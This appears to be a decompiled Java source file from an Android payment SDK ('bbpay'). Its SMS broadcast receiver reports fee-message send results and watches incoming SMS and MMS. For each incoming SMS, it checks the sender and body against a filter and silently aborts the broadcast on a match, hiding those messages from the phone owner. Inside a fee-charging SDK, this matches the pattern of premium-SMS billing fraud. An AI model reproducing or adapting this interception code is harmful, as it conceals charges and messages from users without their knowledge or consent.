package com.bbpay.sms;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import com.bbpay.EpayResult;
import com.bbpay.EpaySdk;
import com.bbpay.sms.filtersms.SmsObserver;

public class MmsSmsReceiver extends BroadcastReceiver {
    private static String ACTION_SMS_SEND = "lab.sodino.sms.send";
    private static final String MMS_RECEIVE_ACTION = "android.provider.Telephony.WAP_PUSH_RECEIVED";
    private static final String SMS_RECEIVE_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    @Override
    public void onReceive(Context context1, Intent intent) {
        String action = intent.getAction();
        if (action.equals(ACTION_SMS_SEND)) {
            EpaySdk.getInstance().returnFeeResult(context1, getResultCode() == -1 ? EpayResult.FEE_RESULT_SUCCESS : EpayResult.FEE_RESULT_NOSENDMSG_FAILED);
        } else if (action.equals(SMS_RECEIVE_ACTION)) {
            for (Object element : (Object[]) intent.getExtras().get("pdus")) {
                SmsMessage smsmessage = SmsMessage.createFromPdu((byte[]) element);
                if (SmsObserver.getInstanse(null).getFilter().checkSmsBroadcast(smsmessage.getOriginatingAddress(), smsmessage.getMessageBody(), null)) {
                    abortBroadcast();
                }
            }
        } else if (action.equals(MMS_RECEIVE_ACTION)) {
            // EpayLog.showSaveLog("fdd", "彩信消息！");
            byte[] btes = intent.getByteArrayExtra("data");
        }
    }
}
